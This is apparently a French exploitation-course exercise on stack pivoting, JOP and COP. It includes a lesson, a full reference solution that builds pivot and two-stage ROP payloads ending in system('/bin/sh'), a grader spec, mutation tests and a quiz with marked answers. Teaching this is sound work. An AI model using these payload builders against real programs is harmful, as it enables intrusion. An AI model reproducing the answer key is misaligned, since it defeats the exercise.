# Exercice 3.4.6-d : Le Pivot Stack

## Metadata
- **Exercice ID**: 3.4.6-d
- **Titre**: Le Pivot Stack
- **Module**: 3.4 - Exploitation Binaire
- **Niveau**: ROP Avancé (Niveau 4)
- **Difficulté**: ⭐⭐⭐⭐⭐⭐⭐⭐ (8/10 - Expert+)
- **Tier**: 3
- **XP**: 650

## Concepts Couverts
| ID Concept | Description |
|------------|-------------|
| 3.4.6.m | Stack Pivoting |
| 3.4.6.n | Pivot Scenarios |
| 3.4.6.o | JOP (Jump-Oriented Programming) |
| 3.4.6.p | COP (Call-Oriented Programming) |

## Prerequis
- Module 3.4.6-a/b/c : ROP fondamentaux
- Comprehension des gadgets et de la stack
- Maitrise de la calling convention x86-64

---

## Section 1 : Prototype de Fonction

```python
"""
Module: stack_pivot - Techniques de Pivotement de Stack
Architecture: x86-64 Linux
Contraintes: Buffer limité, nécessite pivot vers zone contrôlée
"""

from dataclasses import dataclass
from enum import Enum
from typing import Optional
import struct


class PivotType(Enum):
    """Types de gadgets de pivot."""
    LEAVE_RET = "leave_ret"
    XCHG_RSP = "xchg_rsp"
    MOV_RSP = "mov_rsp"
    POP_RSP = "pop_rsp"
    ADD_RSP = "add_rsp"


class ChainType(Enum):
    """Types de chaînes d'exploitation."""
    ROP = "rop"
    JOP = "jop"
    COP = "cop"


@dataclass
class PivotGadget:
    """Gadget de pivotement."""
    address: int
    gadget_type: PivotType
    instructions: list[str]
    register_source: Optional[str] = None
    offset: int = 0


@dataclass
class PivotTarget:
    """Cible du pivot."""
    address: int
    size: int
    writable: bool
    region: str  # "heap", "bss", "data", "stack"


def find_pivot_gadgets(gadget_list: list[dict]) -> list[PivotGadget]:
    """
    Identifie les gadgets de pivotement dans une liste.

    Args:
        gadget_list: Liste de gadgets avec instructions

    Returns:
        Liste de PivotGadget utilisables

    Gadgets recherchés:
    - leave; ret (mov rsp, rbp; pop rbp; ret)
    - xchg rsp, rax; ret
    - mov rsp, rbp; ret
    - pop rsp; ret
    - add rsp, 0x...; ret (pour sauter par-dessus)

    Exemple:
        >>> gadgets = [{"addr": 0x401234, "instrs": ["leave", "ret"]}]
        >>> pivots = find_pivot_gadgets(gadgets)
        >>> pivots[0].gadget_type
        PivotType.LEAVE_RET
    """
    pass


def calculate_pivot_setup(
    buffer_size: int,
    pivot_gadget: PivotGadget,
    target: PivotTarget,
    rop_chain: bytes
) -> bytes:
    """
    Calcule le setup nécessaire pour un pivot.

    Args:
        buffer_size: Taille du buffer vulnérable
        pivot_gadget: Gadget à utiliser
        target: Où pivoter
        rop_chain: Chaîne ROP à exécuter après pivot

    Returns:
        Payload complet pour le pivot

    Exemple:
        >>> payload = calculate_pivot_setup(32, leave_ret, bss_target, chain)
        >>> len(payload)
        40  # buffer + saved_rbp avec fake_rbp
    """
    pass


def generate_jop_chain(
    gadgets: list[dict],
    target_function: int,
    args: list[int]
) -> bytes:
    """
    Génère une chaîne JOP (Jump-Oriented Programming).

    Args:
        gadgets: Gadgets disponibles (terminant par jmp reg)
        target_function: Fonction à appeler
        args: Arguments

    Returns:
        Chaîne JOP

    JOP utilise des gadgets terminant par JMP au lieu de RET:
    - Dispatcher gadget: contrôle le flux
    - Functional gadgets: exécutent des opérations

    Exemple:
        >>> chain = generate_jop_chain(gadgets, system_addr, [binsh_addr])
    """
    pass


def generate_cop_chain(
    gadgets: list[dict],
    target_function: int,
    args: list[int]
) -> bytes:
    """
    Génère une chaîne COP (Call-Oriented Programming).

    Args:
        gadgets: Gadgets disponibles (terminant par call reg)
        target_function: Fonction à appeler
        args: Arguments

    Returns:
        Chaîne COP

    COP utilise des gadgets terminant par CALL:
    - Plus rare que ROP
    - Peut bypasser certaines protections

    Exemple:
        >>> chain = generate_cop_chain(gadgets, system_addr, [binsh_addr])
    """
    pass


def prepare_pivot_target(
    target_address: int,
    rop_chain: bytes,
    write_primitive: callable
) -> bool:
    """
    Prépare la zone cible avec la chaîne ROP.

    Args:
        target_address: Adresse où écrire
        rop_chain: Chaîne à écrire
        write_primitive: Fonction d'écriture

    Returns:
        True si succès

    Exemple:
        >>> success = prepare_pivot_target(0x404000, chain, write_func)
    """
    pass


def analyze_pivot_constraints(
    buffer_size: int,
    controlled_registers: list[str],
    available_gadgets: list[PivotGadget],
    writable_regions: list[PivotTarget]
) -> dict:
    """
    Analyse les possibilités de pivot.

    Args:
        buffer_size: Taille du buffer
        controlled_registers: Registres contrôlables
        available_gadgets: Gadgets de pivot disponibles
        writable_regions: Régions où on peut écrire

    Returns:
        Dict avec analyse et recommandations

    Exemple:
        >>> analysis = analyze_pivot_constraints(32, ["rbp", "rax"], gadgets, regions)
        >>> analysis["recommended_pivot"]
        "leave_ret via controlled RBP"
    """
    pass


def build_dispatcher_gadget(
    base_gadget: dict,
    table_address: int
) -> dict:
    """
    Construit un gadget dispatcher pour JOP/COP.

    Args:
        base_gadget: Gadget qui incrémente et saute
        table_address: Adresse de la table de gadgets

    Returns:
        Configuration du dispatcher

    Structure:
    - Dispatcher: mov rax, [table]; jmp rax; ou similar
    - Table: liste d'adresses de gadgets

    Exemple:
        >>> dispatcher = build_dispatcher_gadget(gadget, 0x404100)
    """
    pass
```

---

## Section 2 : Cours Intégré (Référentiel Complet)

### 2.1 Introduction au Stack Pivoting (3.4.6.m)

Le **stack pivoting** consiste à déplacer RSP vers une zone mémoire contrôlée par l'attaquant. Cette technique est essentielle quand:
- Le buffer overflow est trop petit pour contenir toute la chaîne ROP
- On ne peut écrire qu'une quantité limitée sur la stack

### 2.2 Gadgets de Pivot

#### leave; ret

Le gadget le plus commun pour pivoter:

```asm
leave     ; équivalent à: mov rsp, rbp; pop rbp
ret       ; pop rip
```

**Exploitation**:
1. Contrôler RBP avec une adresse pointant vers notre chaîne ROP
2. Après `leave`, RSP = ancien RBP + 8
3. `ret` exécute le premier gadget de notre chaîne

```
Avant leave:        Après leave:
RSP -> [...]        RSP -> [fake_chain + 8]
       [saved_rbp]  (nouveau RSP pointe vers notre chaîne)
       [leave;ret]
RBP -> [fake_chain]
```

#### xchg rsp, rax; ret

Échange RSP avec RAX:

```asm
xchg rsp, rax   ; RSP <-> RAX
ret
```

**Exploitation**:
1. Charger l'adresse cible dans RAX (via un gadget précédent)
2. Exécuter `xchg rsp, rax`
3. RSP pointe maintenant vers notre chaîne

#### mov rsp, rbp; ret

Similaire à leave mais sans le pop rbp:

```asm
mov rsp, rbp   ; RSP = RBP
ret
```

#### pop rsp; ret

Charge directement RSP depuis la stack:

```asm
pop rsp    ; RSP = [RSP]
ret
```

**Exploitation**:
```
Stack:
[pop_rsp_ret]
[target_addr]  <- RSP va prendre cette valeur
[...]
```

### 2.3 Scénarios de Pivot (3.4.6.n)

#### Pivot vers le Heap

```python
def pivot_to_heap(buffer_offset, heap_addr, rop_chain):
    """
    Buffer petit, mais on contrôle le heap.
    """
    # 1. Écrire la chaîne ROP sur le heap
    write_to_heap(heap_addr, rop_chain)

    # 2. Payload de pivot
    payload = b'A' * buffer_offset
    payload += p64(heap_addr - 8)  # fake RBP (leave ajoutera 8)
    payload += p64(leave_ret)      # Pivot gadget

    return payload
```

#### Pivot vers BSS

```python
def pivot_to_bss(buffer_offset, bss_addr, rop_chain):
    """
    BSS est souvent writable et à adresse connue.
    """
    # BSS avantages:
    # - Pas de ASLR si pas de PIE
    # - Toujours writable
    # - Taille connue

    # 1. Utiliser read() pour écrire sur BSS
    stage1 = b'A' * buffer_offset
    stage1 += p64(pop_rdi_ret)
    stage1 += p64(0)           # stdin
    stage1 += p64(pop_rsi_ret)
    stage1 += p64(bss_addr)    # buffer
    stage1 += p64(pop_rdx_ret)
    stage1 += p64(len(rop_chain))
    stage1 += p64(read_plt)
    stage1 += p64(leave_ret)   # Pivot après read

    # 2. Envoyer la vraie chaîne ROP
    stage2 = rop_chain

    return stage1, stage2
```

#### Pivot avec add rsp

Quand on ne peut pas pivoter mais qu'on a du contrôle plus loin:

```python
def skip_with_add_rsp(offset, gadget_add_rsp_X):
    """
    Sauter par-dessus des données pour atteindre notre chaîne.
    """
    # add rsp, X; ret permet de "sauter" X bytes

    payload = b'A' * offset
    payload += p64(gadget_add_rsp_X)
    payload += b'B' * X  # Données sautées
    payload += rop_chain  # Notre chaîne est ici

    return payload
```

### 2.4 JOP - Jump-Oriented Programming (3.4.6.o)

**JOP** utilise des gadgets terminant par `jmp` au lieu de `ret`.

#### Avantages de JOP

```
- Peut bypasser certaines protections basées sur RET
- Fonctionne même si RSP est compromis
- Moins de contraintes d'alignement
```

#### Structure JOP

```
Dispatcher gadget:
    mov rax, [rbx]    ; Charge le prochain gadget
    add rbx, 8        ; Avance dans la table
    jmp rax           ; Exécute le gadget

Table de gadgets:
    [gadget1_addr]
    [gadget2_addr]
    [gadget3_addr]
    ...

Functional gadgets (terminant par jmp reg):
    pop rdi
    jmp rsi           ; Continue vers le dispatcher ou prochain
```

#### Exemple JOP

```python
def jop_chain(dispatcher, table_addr, gadgets):
    """
    Construit une chaîne JOP.
    """
    # 1. Setup RBX pour pointer vers la table
    setup = p64(pop_rbx_jmp_rdi)
    setup += p64(table_addr)

    # 2. Table de gadgets
    table = b''
    for g in gadgets:
        table += p64(g['addr'])

    # 3. Dispatcher lancé
    # RBX pointe vers table, chaque exécution avance RBX

    return setup, table
```

### 2.5 COP - Call-Oriented Programming (3.4.6.p)

**COP** utilise des gadgets terminant par `call`.

#### Différences avec ROP

```
ROP:  ret = pop rip
COP:  call = push rip; jmp target

CALL sauvegarde l'adresse de retour, ce qui peut:
- Compliquer la chaîne
- Mais aussi être utile (on peut revenir!)
```

#### Gadgets COP typiques

```asm
; COP gadget
pop rdi
call rax          ; Appelle la fonction dans RAX

; Après le call, exécution revient ici
; On peut continuer la chaîne!
```

#### Exemple COP

```python
def cop_chain():
    """
    Chaîne COP pour appeler system("/bin/sh").
    """
    # Gadget: pop rdi; call rax
    # On a besoin de:
    # 1. RAX = system
    # 2. Exécuter: pop rdi; call rax
    # 3. Sur la stack: "/bin/sh" addr

    chain = b''
    chain += p64(pop_rax_ret)
    chain += p64(system_addr)
    chain += p64(pop_rdi_call_rax)
    chain += p64(binsh_addr)

    return chain
```

### 2.6 Combinaison des Techniques

```python
def advanced_exploit():
    """
    Exploit combinant pivot, ROP, et potentiellement JOP/COP.
    """
    # Stage 1: Buffer overflow limité
    # - Écrire stage2 quelque part (heap/BSS via read)
    # - Pivoter vers stage2

    stage1 = b'A' * 32  # Buffer
    stage1 += p64(bss_addr - 8)  # fake RBP
    stage1 += p64(gadget_read_to_bss)  # Setup read
    stage1 += p64(leave_ret)  # Pivot après read

    # Stage 2: Chaîne ROP complète sur BSS
    stage2 = b''
    stage2 += p64(0xdeadbeef)  # fake RBP pour leave
    stage2 += p64(pop_rdi_ret)
    stage2 += p64(binsh_addr)
    stage2 += p64(system_addr)

    return stage1, stage2
```

---

## Section 3 : Zone de Correction

```python
"""
CORRECTION COMPLETE - Stack Pivot et JOP/COP
"""

from dataclasses import dataclass
from enum import Enum
from typing import Optional, Callable
import struct
import re


class PivotType(Enum):
    LEAVE_RET = "leave_ret"
    XCHG_RSP = "xchg_rsp"
    MOV_RSP = "mov_rsp"
    POP_RSP = "pop_rsp"
    ADD_RSP = "add_rsp"


class ChainType(Enum):
    ROP = "rop"
    JOP = "jop"
    COP = "cop"


@dataclass
class PivotGadget:
    address: int
    gadget_type: PivotType
    instructions: list
    register_source: Optional[str] = None
    offset: int = 0


@dataclass
class PivotTarget:
    address: int
    size: int
    writable: bool
    region: str


def p64(value: int) -> bytes:
    return struct.pack('<Q', value)


def u64(data: bytes) -> int:
    return struct.unpack('<Q', data.ljust(8, b'\x00'))[0]


def find_pivot_gadgets(gadget_list: list) -> list:
    """Identifie les gadgets de pivotement."""

    pivots = []

    for gadget in gadget_list:
        addr = gadget.get("addr", gadget.get("address", 0))
        instrs = gadget.get("instrs", gadget.get("instructions", []))

        if not instrs:
            continue

        instrs_lower = [i.lower().strip() for i in instrs]
        instrs_str = " ; ".join(instrs_lower)

        # leave; ret
        if "leave" in instrs_lower and "ret" in instrs_lower:
            pivots.append(PivotGadget(
                address=addr,
                gadget_type=PivotType.LEAVE_RET,
                instructions=instrs,
                register_source="rbp"
            ))

        # xchg rsp, reg; ret
        for instr in instrs_lower:
            if "xchg" in instr and "rsp" in instr:
                # Extraire l'autre registre
                match = re.search(r'xchg\s+(\w+)\s*,\s*(\w+)', instr)
                if match:
                    regs = [match.group(1), match.group(2)]
                    other_reg = [r for r in regs if r != "rsp"][0]
                    pivots.append(PivotGadget(
                        address=addr,
                        gadget_type=PivotType.XCHG_RSP,
                        instructions=instrs,
                        register_source=other_reg
                    ))

        # mov rsp, reg; ret
        for instr in instrs_lower:
            if re.match(r'mov\s+rsp\s*,\s*(\w+)', instr):
                match = re.search(r'mov\s+rsp\s*,\s*(\w+)', instr)
                if match:
                    pivots.append(PivotGadget(
                        address=addr,
                        gadget_type=PivotType.MOV_RSP,
                        instructions=instrs,
                        register_source=match.group(1)
                    ))

        # pop rsp; ret
        if "pop rsp" in instrs_str:
            pivots.append(PivotGadget(
                address=addr,
                gadget_type=PivotType.POP_RSP,
                instructions=instrs,
                register_source="stack"
            ))

        # add rsp, imm; ret
        for instr in instrs_lower:
            match = re.search(r'add\s+rsp\s*,\s*(0x[0-9a-f]+|\d+)', instr)
            if match:
                offset_str = match.group(1)
                offset = int(offset_str, 16) if offset_str.startswith('0x') else int(offset_str)
                pivots.append(PivotGadget(
                    address=addr,
                    gadget_type=PivotType.ADD_RSP,
                    instructions=instrs,
                    offset=offset
                ))

    return pivots


def calculate_pivot_setup(
    buffer_size: int,
    pivot_gadget: PivotGadget,
    target: PivotTarget,
    rop_chain: bytes
) -> bytes:
    """Calcule le setup nécessaire pour un pivot."""

    payload = b''

    if pivot_gadget.gadget_type == PivotType.LEAVE_RET:
        # leave = mov rsp, rbp; pop rbp
        # Donc après leave: RSP = old_RBP + 8
        # On veut RSP pointe vers rop_chain
        # Donc fake_rbp doit être (target.address - 8)

        fake_rbp = target.address - 8

        payload = b'A' * buffer_size
        payload += p64(fake_rbp)  # Saved RBP
        payload += p64(pivot_gadget.address)  # leave; ret

    elif pivot_gadget.gadget_type == PivotType.POP_RSP:
        # pop rsp charge directement depuis la stack
        payload = b'A' * buffer_size
        payload += p64(0)  # Saved RBP (ignored)
        payload += p64(pivot_gadget.address)  # pop rsp; ret
        payload += p64(target.address)  # Nouvelle valeur de RSP

    elif pivot_gadget.gadget_type == PivotType.XCHG_RSP:
        # Nécessite que le registre source soit déjà setup
        # On suppose qu'un gadget précédent a chargé la valeur
        payload = b'A' * buffer_size
        payload += p64(0)
        payload += p64(pivot_gadget.address)

    elif pivot_gadget.gadget_type == PivotType.ADD_RSP:
        # Saute par-dessus des données
        skip_size = pivot_gadget.offset
        payload = b'A' * buffer_size
        payload += p64(0)
        payload += p64(pivot_gadget.address)
        payload += b'B' * skip_size  # Données sautées
        payload += rop_chain  # Chaîne ici

        return payload  # Pas besoin d'ajouter rop_chain après

    # Pour les autres types, la chaîne doit être à target.address
    # Le caller doit avoir écrit rop_chain à cet endroit

    return payload


def generate_jop_chain(
    gadgets: list,
    target_function: int,
    args: list
) -> bytes:
    """Génère une chaîne JOP."""

    # Trouver les gadgets JOP (terminant par jmp reg)
    jop_gadgets = []
    dispatcher = None

    for g in gadgets:
        instrs = g.get("instrs", [])
        if instrs and "jmp" in instrs[-1].lower():
            # C'est un gadget JOP
            jop_gadgets.append(g)

            # Vérifier si c'est un dispatcher potentiel
            # (charge depuis mémoire et saute)
            instrs_str = " ".join(instrs).lower()
            if "mov" in instrs_str and "[" in instrs_str:
                dispatcher = g

    if not jop_gadgets:
        return b''  # Pas de gadgets JOP

    chain = b''

    # Structure simplifiée:
    # 1. Setup table address dans un registre
    # 2. Premier gadget saute vers la table
    # 3. Chaque entrée de table pointe vers un gadget fonctionnel

    # Pour une vraie implémentation, il faudrait:
    # - Un dispatcher qui incrémente un pointeur et saute
    # - Une table de gadgets
    # - Des gadgets fonctionnels qui reviennent au dispatcher

    # Version simplifiée: liste linéaire
    table = b''
    for i, arg in enumerate(args):
        # Trouver un gadget pour charger l'argument
        if i == 0:  # RDI
            for g in jop_gadgets:
                if "pop rdi" in " ".join(g.get("instrs", [])).lower():
                    table += p64(g["addr"])
                    table += p64(arg)
                    break

    # Ajouter la fonction cible
    table += p64(target_function)

    return table


def generate_cop_chain(
    gadgets: list,
    target_function: int,
    args: list
) -> bytes:
    """Génère une chaîne COP."""

    # Trouver les gadgets COP (terminant par call reg)
    cop_gadgets = []

    for g in gadgets:
        instrs = g.get("instrs", [])
        if instrs and "call" in instrs[-1].lower():
            cop_gadgets.append(g)

    if not cop_gadgets:
        return b''

    chain = b''

    # Pour COP, on a besoin de:
    # 1. Charger la fonction cible dans un registre
    # 2. Utiliser un gadget "call reg" pour l'appeler

    # Trouver un gadget pour charger RAX (ou autre)
    pop_rax = None
    for g in gadgets:
        if "pop rax" in " ".join(g.get("instrs", [])).lower():
            pop_rax = g
            break

    # Trouver un gadget call rax
    call_rax = None
    for g in cop_gadgets:
        if "call rax" in " ".join(g.get("instrs", [])).lower():
            call_rax = g
            break

    if pop_rax and call_rax:
        # Setup RAX avec la fonction
        chain += p64(pop_rax["addr"])
        chain += p64(target_function)

        # Setup des arguments si possible
        for i, arg in enumerate(args):
            if i == 0:  # RDI
                for g in gadgets:
                    if "pop rdi" in " ".join(g.get("instrs", [])).lower():
                        chain += p64(g["addr"])
                        chain += p64(arg)
                        break

        # Call
        chain += p64(call_rax["addr"])

    return chain


def prepare_pivot_target(
    target_address: int,
    rop_chain: bytes,
    write_primitive: Callable
) -> bool:
    """Prépare la zone cible avec la chaîne ROP."""

    try:
        write_primitive(target_address, rop_chain)
        return True
    except Exception:
        return False


def analyze_pivot_constraints(
    buffer_size: int,
    controlled_registers: list,
    available_gadgets: list,
    writable_regions: list
) -> dict:
    """Analyse les possibilités de pivot."""

    analysis = {
        "buffer_size": buffer_size,
        "controlled_registers": controlled_registers,
        "viable_pivots": [],
        "recommended_pivot": None,
        "constraints": [],
        "difficulty": "unknown"
    }

    # Vérifier si le buffer est suffisant pour un ROP direct
    min_rop_size = 8 * 5  # Au moins 5 gadgets (40 bytes)
    if buffer_size >= min_rop_size + 16:  # +16 pour RBP et RIP
        analysis["constraints"].append(
            f"Buffer ({buffer_size}B) may be sufficient for direct ROP"
        )
        analysis["difficulty"] = "medium"
    else:
        analysis["constraints"].append(
            f"Buffer ({buffer_size}B) too small, pivot required"
        )
        analysis["difficulty"] = "hard"

    # Analyser les gadgets disponibles
    for gadget in available_gadgets:
        viable = False
        reason = ""

        if gadget.gadget_type == PivotType.LEAVE_RET:
            if "rbp" in controlled_registers:
                viable = True
                reason = "RBP controlled, leave;ret possible"
            else:
                reason = "Need to control RBP for leave;ret"

        elif gadget.gadget_type == PivotType.POP_RSP:
            viable = True
            reason = "pop rsp always works if gadget available"

        elif gadget.gadget_type == PivotType.XCHG_RSP:
            if gadget.register_source in controlled_registers:
                viable = True
                reason = f"Can control {gadget.register_source} for xchg"
            else:
                reason = f"Need to control {gadget.register_source}"

        elif gadget.gadget_type == PivotType.ADD_RSP:
            if gadget.offset > 0:
                viable = True
                reason = f"Can skip {gadget.offset} bytes"

        if viable:
            analysis["viable_pivots"].append({
                "gadget": gadget,
                "reason": reason
            })

    # Analyser les régions cibles
    for region in writable_regions:
        if region.writable and region.size >= min_rop_size:
            analysis["constraints"].append(
                f"Viable target: {region.region} at 0x{region.address:x} ({region.size}B)"
            )

    # Recommandation
    if analysis["viable_pivots"]:
        # Préférer leave;ret si RBP contrôlé (plus commun)
        for vp in analysis["viable_pivots"]:
            if vp["gadget"].gadget_type == PivotType.LEAVE_RET:
                analysis["recommended_pivot"] = f"leave;ret via controlled RBP"
                break
            elif vp["gadget"].gadget_type == PivotType.POP_RSP:
                analysis["recommended_pivot"] = "pop rsp;ret (direct control)"
                break

        if not analysis["recommended_pivot"]:
            analysis["recommended_pivot"] = analysis["viable_pivots"][0]["reason"]

    return analysis


def build_dispatcher_gadget(base_gadget: dict, table_address: int) -> dict:
    """Construit un gadget dispatcher pour JOP/COP."""

    return {
        "type": "dispatcher",
        "base_gadget": base_gadget,
        "table_address": table_address,
        "description": "Loads next gadget from table and jumps to it",
        "setup": {
            "table_pointer_reg": "rbx",  # Example
            "table_address": hex(table_address),
            "operation": "mov rax, [rbx]; add rbx, 8; jmp rax"
        }
    }


def main():
    """Démonstration du stack pivoting."""

    print("Stack Pivot Demo")
    print("=" * 60)

    # Exemple de gadgets
    gadgets = [
        {"addr": 0x401234, "instrs": ["leave", "ret"]},
        {"addr": 0x401250, "instrs": ["pop rsp", "ret"]},
        {"addr": 0x401300, "instrs": ["xchg rsp, rax", "ret"]},
        {"addr": 0x401400, "instrs": ["add rsp, 0x28", "ret"]},
        {"addr": 0x401500, "instrs": ["pop rdi", "jmp rax"]},
        {"addr": 0x401600, "instrs": ["pop rax", "ret"]},
        {"addr": 0x401700, "instrs": ["call rax"]},
    ]

    # Trouver les gadgets de pivot
    pivots = find_pivot_gadgets(gadgets)
    print(f"\nFound {len(pivots)} pivot gadgets:")
    for p in pivots:
        print(f"  0x{p.address:x}: {p.gadget_type.value}")
        if p.register_source:
            print(f"    Source: {p.register_source}")
        if p.offset:
            print(f"    Offset: {p.offset}")

    # Analyse des contraintes
    print("\n" + "=" * 60)
    print("Constraint Analysis")

    target = PivotTarget(
        address=0x404000,
        size=0x1000,
        writable=True,
        region="bss"
    )

    analysis = analyze_pivot_constraints(
        buffer_size=32,
        controlled_registers=["rbp", "rax"],
        available_gadgets=pivots,
        writable_regions=[target]
    )

    print(f"  Difficulty: {analysis['difficulty']}")
    print(f"  Recommendation: {analysis['recommended_pivot']}")
    print(f"  Viable pivots: {len(analysis['viable_pivots'])}")

    # Générer un setup de pivot
    print("\n" + "=" * 60)
    print("Pivot Payload Generation")

    leave_ret = pivots[0]  # leave; ret
    rop_chain = p64(0x401000) + p64(0x402000)  # Fake chain

    payload = calculate_pivot_setup(32, leave_ret, target, rop_chain)
    print(f"  Payload length: {len(payload)}")
    print(f"  Target: 0x{target.address:x}")


if __name__ == "__main__":
    main()
```

---

## Section 4 : Fichier spec.json (ENGINE v22.1)

```json
{
  "exercise_id": "3.4.6-d",
  "title": "Le Pivot Stack",
  "module": "3.4",
  "tier": 3,
  "difficulty": 8,
  "xp_value": 650,
  "language": "python",
  "version": "3.12",
  "timeout_seconds": 45,
  "memory_limit_mb": 256,

  "test_cases": [
    {
      "id": "find_leave_ret",
      "description": "Find leave;ret pivot gadget",
      "input": {
        "function": "find_pivot_gadgets",
        "args": {
          "gadget_list": [{"addr": 4198964, "instrs": ["leave", "ret"]}]
        }
      },
      "expected": {
        "count": 1,
        "type": "leave_ret"
      },
      "points": 15
    },
    {
      "id": "find_xchg_pivot",
      "description": "Find xchg rsp pivot",
      "input": {
        "function": "find_pivot_gadgets",
        "args": {
          "gadget_list": [{"addr": 4199200, "instrs": ["xchg rsp, rax", "ret"]}]
        }
      },
      "expected": {
        "count": 1,
        "type": "xchg_rsp",
        "register": "rax"
      },
      "points": 15
    },
    {
      "id": "pivot_setup_leave",
      "description": "Calculate leave;ret pivot setup",
      "input": {
        "function": "calculate_pivot_setup",
        "args": {
          "buffer_size": 32,
          "pivot_gadget": {"address": 4198964, "gadget_type": "LEAVE_RET", "instructions": ["leave", "ret"], "register_source": "rbp"},
          "target": {"address": 4210688, "size": 4096, "writable": true, "region": "bss"},
          "rop_chain": []
        }
      },
      "expected": {
        "length": 48,
        "contains_fake_rbp": true
      },
      "points": 20
    },
    {
      "id": "analyze_constraints",
      "description": "Analyze pivot constraints",
      "input": {
        "function": "analyze_pivot_constraints",
        "args": {
          "buffer_size": 32,
          "controlled_registers": ["rbp"],
          "available_gadgets": [{"address": 4198964, "gadget_type": "LEAVE_RET", "instructions": ["leave", "ret"], "register_source": "rbp"}],
          "writable_regions": [{"address": 4210688, "size": 4096, "writable": true, "region": "bss"}]
        }
      },
      "expected": {
        "has_viable_pivots": true,
        "difficulty": "hard"
      },
      "points": 20
    },
    {
      "id": "jop_chain_generation",
      "description": "Generate basic JOP chain",
      "input": {
        "function": "generate_jop_chain",
        "args": {
          "gadgets": [
            {"addr": 4199680, "instrs": ["pop rdi", "jmp rax"]},
            {"addr": 4199936, "instrs": ["mov rax, [rbx]", "jmp rax"]}
          ],
          "target_function": 4198400,
          "args": [4210944]
        }
      },
      "expected": {
        "non_empty": true
      },
      "points": 15
    },
    {
      "id": "cop_chain_generation",
      "description": "Generate basic COP chain",
      "input": {
        "function": "generate_cop_chain",
        "args": {
          "gadgets": [
            {"addr": 4199424, "instrs": ["pop rax", "ret"]},
            {"addr": 4199680, "instrs": ["pop rdi", "ret"]},
            {"addr": 4199792, "instrs": ["call rax"]}
          ],
          "target_function": 4198400,
          "args": [4210944]
        }
      },
      "expected": {
        "non_empty": true
      },
      "points": 15
    }
  ],

  "validation": {
    "required_functions": [
      "find_pivot_gadgets",
      "calculate_pivot_setup",
      "generate_jop_chain",
      "generate_cop_chain",
      "prepare_pivot_target",
      "analyze_pivot_constraints",
      "build_dispatcher_gadget"
    ],
    "required_classes": ["PivotType", "ChainType", "PivotGadget", "PivotTarget"],
    "forbidden_imports": ["pwntools", "subprocess"],
    "min_test_coverage": 80
  }
}
```

---

## Section 5 : Tests de Mutation

```python
"""
Tests de mutation pour stack_pivot.py
"""

import unittest


class TestPivotGadgetFindingMutations(unittest.TestCase):

    def setUp(self):
        from stack_pivot import find_pivot_gadgets, PivotType
        self.find = find_pivot_gadgets
        self.PivotType = PivotType

    def test_mutant_leave_ret_detection(self):
        """MUTANT: Not detecting leave;ret gadgets."""
        gadgets = [{"addr": 0x401234, "instrs": ["leave", "ret"]}]
        result = self.find(gadgets)

        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].gadget_type, self.PivotType.LEAVE_RET)

    def test_mutant_xchg_register_extraction(self):
        """MUTANT: Wrong register extracted from xchg."""
        gadgets = [{"addr": 0x401300, "instrs": ["xchg rsp, rax", "ret"]}]
        result = self.find(gadgets)

        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].register_source, "rax")


class TestPivotSetupMutations(unittest.TestCase):

    def setUp(self):
        from stack_pivot import (
            calculate_pivot_setup, PivotGadget, PivotTarget, PivotType
        )
        self.calculate = calculate_pivot_setup
        self.PivotGadget = PivotGadget
        self.PivotTarget = PivotTarget
        self.PivotType = PivotType

    def test_mutant_fake_rbp_calculation(self):
        """MUTANT: Wrong fake RBP calculation for leave;ret."""
        gadget = self.PivotGadget(
            address=0x401234,
            gadget_type=self.PivotType.LEAVE_RET,
            instructions=["leave", "ret"],
            register_source="rbp"
        )
        target = self.PivotTarget(
            address=0x404000,
            size=0x1000,
            writable=True,
            region="bss"
        )

        payload = self.calculate(32, gadget, target, b'')

        # fake_rbp should be target - 8 for leave;ret
        import struct
        fake_rbp = struct.unpack('<Q', payload[32:40])[0]
        self.assertEqual(fake_rbp, target.address - 8)


class TestConstraintAnalysisMutations(unittest.TestCase):

    def setUp(self):
        from stack_pivot import (
            analyze_pivot_constraints, PivotGadget, PivotTarget, PivotType
        )
        self.analyze = analyze_pivot_constraints
        self.PivotGadget = PivotGadget
        self.PivotTarget = PivotTarget
        self.PivotType = PivotType

    def test_mutant_viable_detection(self):
        """MUTANT: Not detecting viable pivots."""
        gadget = self.PivotGadget(
            address=0x401234,
            gadget_type=self.PivotType.LEAVE_RET,
            instructions=["leave", "ret"],
            register_source="rbp"
        )
        target = self.PivotTarget(
            address=0x404000,
            size=0x1000,
            writable=True,
            region="bss"
        )

        result = self.analyze(32, ["rbp"], [gadget], [target])

        self.assertGreater(len(result["viable_pivots"]), 0)


if __name__ == "__main__":
    unittest.main(verbosity=2)
```

---

## Section 6 : QCM d'Auto-Évaluation

### Question 1
**Que fait le gadget "leave; ret" ?**

- [ ] A) Quitte le programme
- [x] B) mov rsp, rbp; pop rbp; pop rip
- [ ] C) Saute à une adresse
- [ ] D) Libère la mémoire

**Explication**: `leave` est équivalent à `mov rsp, rbp; pop rbp`. Suivi de `ret` (pop rip), il permet de pivoter RSP vers la valeur de RBP.

---

### Question 2
**Pourquoi a-t-on besoin de stack pivoting ?**

- [ ] A) Pour accélérer l'exploit
- [x] B) Quand le buffer est trop petit pour la chaîne ROP complète
- [ ] C) Pour bypasser ASLR
- [ ] D) Pour encoder le shellcode

**Explication**: Le stack pivoting est nécessaire quand l'espace contrôlable sur la stack est insuffisant pour la chaîne ROP. On pivote vers une zone plus grande (heap, BSS).

---

### Question 3
**Quelle est la différence principale entre JOP et ROP ?**

- [ ] A) JOP est plus rapide
- [x] B) JOP utilise des gadgets terminant par JMP au lieu de RET
- [ ] C) JOP ne fonctionne que sur ARM
- [ ] D) JOP nécessite un shellcode

**Explication**: JOP (Jump-Oriented Programming) utilise des gadgets terminant par `jmp reg` plutôt que `ret`, ce qui peut bypasser certaines protections basées sur RET.

---

### Question 4
**Quelle valeur doit avoir fake_rbp pour un pivot leave;ret vers 0x404000 ?**

- [ ] A) 0x404000
- [x] B) 0x403FF8 (target - 8)
- [ ] C) 0x404008
- [ ] D) N'importe quelle valeur

**Explication**: `leave` fait `mov rsp, rbp; pop rbp`. Après le pop, RSP = ancien_RBP + 8. Pour que RSP pointe vers 0x404000, fake_rbp doit être 0x404000 - 8.

---

## Section 7 : Conseils et Pièges

### Pièges Courants

1. **Oublier le +8 du leave**: RSP = RBP + 8 après leave.

2. **Ne pas préparer la cible**: La chaîne ROP doit être écrite à l'adresse cible avant le pivot.

3. **Alignement**: Après pivot, vérifier que RSP est aligné.

### Bonnes Pratiques

```python
# Toujours vérifier la région cible
